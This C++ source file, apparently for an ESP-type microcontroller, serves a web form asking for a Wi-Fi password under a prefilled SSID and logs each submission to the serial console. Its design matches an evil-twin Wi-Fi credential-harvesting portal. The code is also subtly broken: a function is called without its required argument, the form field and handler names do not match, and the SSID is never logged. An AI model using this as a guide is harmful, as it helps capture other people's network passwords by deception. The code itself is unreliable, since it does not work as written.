#include"WebPortal.h"

namespace WebPortal{
    String getHTML(String& SSID){
        String HTMLTemplate = 
        R"rawliteral(<!DOCTYPE html>
        <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width", initial-scale=1.0>
                <style>
                *{
                    color: Black;
                    size: 20px;
                }
                body {
                    background-color: coral;
                }
                
                </style>
            </head>
            <body>
                <div id ="mainContainer">
                    <h1>Hi friend, try edit me!</h1>
                    <form id = "inputForm" action = "\submit" method = "post">
                        <label for="ssidInput">Wifi Network SSID:</label><br>
                        <input type="text" placeholder = "{{SSID}}"><br><br>
                        <label for="passwordInput">Password: (30 characters max)</label><br>
                        <input type="text" class="inputBar" name="passwordInput"><br><br>
                        <input type="submit" value="Enter">
                    </form>
                </div>
            </body>
        </html>)rawliteral";

        HTMLTemplate.replace("{{SSID}}", SSID);
        return HTMLTemplate;
    }

    void handleConnect(){
        Serial.println("Page Visited.");
        server.send(200, "text/html", getHTML());

    }

    void handleSubmit() {
        if (server.hasArg("passwordEnter")) {
            String userPW = server.arg("passwordEnter");
            Serial.println("--------NEW PASSWORD SUBMISSION--------");
            Serial.print("SSID: ");
            Serial.print("Password: ");
            Serial.println(userPW);
        } else {
            Serial.println("No password entered.");
        }

        server.send(200, "text/html", getHTML());
    }
} 
